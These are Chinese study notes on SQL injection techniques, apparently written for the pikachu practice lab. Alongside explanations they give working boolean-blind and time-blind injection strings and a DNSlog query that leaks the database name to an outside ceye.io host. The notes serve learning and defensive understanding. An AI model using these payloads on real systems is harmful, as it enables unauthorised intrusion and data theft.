SQL注入

1.注入原理

SQL注入攻击漏洞产生的原因，是程序员在编写程序时没有对提交的参数进行严格的过滤和判断。用户通过伪造SQL查询语句，将恶意代码发送给数据库执行，从而获取敏感信息甚至执行危险代码和系统命令。

2.URL编码

浏览器中用来打包表单输入的格式。将每对name/value由&分开，name和 value由=号连接。任何特殊符号由百分号%用十六进制编码（ASCII码）

URL不包含空格，将空格编码成加号+或者%20

3.判断是否存在注入点

通过永真条件or 1=1或者永假条件and 1=2判断

通过单引号和双引号判断

4.SQL注入分类

4.1数据类型分类

数字型：传入的数据是数字，源码中无引号闭合

字符型：传入的数据是字符串，源码中使用单引号或者双引号闭合

搜索型：传入的数据是字符串

xx型注入：使用括号闭合传入的参数

json类型：因为不同语言之间数据类型不通用，在互相传输数据时，使用第三方数据格式，json或者xml。如果发送的是jason数据，在HTTP请求行中Content-Type: application/json

4.2提交方式分类

GET提交

POST提交

COOKIE提交

4.3注入位置分类

HTTP 1.0定义了3种请求方法：GET,POST,HEAD

请求行注入

http header请求头注入

请求体注入

4.4报错注入

产生原因：后端没有处理数据库的报错信息，将报错信息输出，通过构造错误语法的SQL语句，使报错信息中携带重要信息如：库名、表名。

常用报错函数及payload

4.5宽字节注入

原理：后端代码为了防止SQL注入，对请求的特殊字符进行了转义处理，在特殊字符前增加了反斜杠\（URL为%5C）。攻击者在特定的字符编码下构造十六进制数与转义后出现的%5C 形成特定字符编码中的一个字符。

以GBK编码为例（pikachu靶场宽字符注入）：php语言可以通过函数 addslashes ()  ****或者配置php.ini 文件中的magic_quotes_gpc=on（php版本5.4以下有效）进行特殊字符转义

4.6偏移量注入

原理：知道要查询的表名，但不知道字段名称时使用。

条件：前面查询的字段数量大于后面联合查询的字段数量，

假设：member表有四个字段：id,username,password,email。user表有2个字段：username，password

4.7加密注入

原理：前端获取用户输入的信息后经过加密发送给后端，后端使用相同的算法解密获取明文。因此构造的SQL注入语句要使用同样的加密算法经过加密之后发送才有效。

4.8堆叠注入

顾名思义，堆叠注入就是执行多条SQL语句。SQL语句之间通过分号;进行分隔不同的语句。

在php语言中支持堆叠注入的函数为：mysqli_multi_query() 和mysql_multi_query 。这两个函数能够执行分号之后的SQL语句。

4.9二次注入

原理：第一次数据库进行插入数据的时候，以php语言举例，使用 addslashes ()  或者配置php.ini文件，执行的时候对其中的特殊字符进行了转义，但是将构造的数据写入了数据库，数据在存入数据库后被认为是可信的。在下一次查询时没有进行校验和处理。就有了第二次的注入，查询出其中恶意构造的数据进行再次构造SQL注入语句。

  1. 构造恶意恶意数据，
    进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
  2. 引用恶意数据
    开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

4.10中转注入

将构造的SQL语句发送到另一个网站进行二次加工（base64加密或其他）

4.11布尔盲注

无回显：构造的查询语句输入之后没有返回信息，无法确定SQL语句是否有执行，是否正确执行还是报错。

原理：通过构造一个正确的，如果执行了会有正常回显信息的SQL语句，判断SQL是否有执行。

以pikachu靶场的布尔盲注为例：

  1. 输入一个正常的值：vince，看一下回显的信息是什么
  2. 输入构造的SQL判断是否能够执行：vince' and 1=1 # ，发现能够正常回显。所以就可以构造and 后面的SQL语句
  3. vince' and ascii(substr(database(),1,1))=112# ：通过观察页面是否能够正常回显vince的信息，判断出当前数据库名称的第一个字符的ASCII值是否为112（p），通过变换ascii值和字符起始位置，依次查询出数据库名、表明、字段名。

4.12时间盲注

不同于布尔型盲注，时间盲注适用于无论输入的值是正确还是错误，都不会有回显信息。

原理：通过构造一个有时间延迟的SQL语句，页面如果在设定的时间延迟才刷新，证明构造的SQL语句有被执行。

  1. 输入一个正确的值vince，页面立即刷新
  2. 判断是否有注入点：vince' and sleep(5)# ,通过观察页面是否经过5秒才刷新，判断出SQL语句是否执行。
  3. 构造SQL语句，获取数据库信息：vince' and if(substr(database(),1,1)='p',sleep(5),null)# ，判断当前数据库名称第一个字符是否为’p’，如果是，就时间延迟5秒，不是就返回空→立即刷新
  4. 重复上述步骤，查询出数据库信息。

4.13DNSlog注入

原理：DNS在解析时会在DNS服务器上留下域名和解析IP的记录，在DNS服务器上查看日志

具备DNS日志功能的网站：

  1. http://ceye.io/ 创宇公司提供的
  2. http://www.dnslog.cn

条件：需要MySQL用户具备读取文件的权限，在MySQL中配置和开启secure_file_priv

使用的函数：load_file(路径) 加载本地文件或者对URL（UNC路径）发起请求。

select load_file(concat('//',(select database()),'.vspoig.ceye.io/abc'))
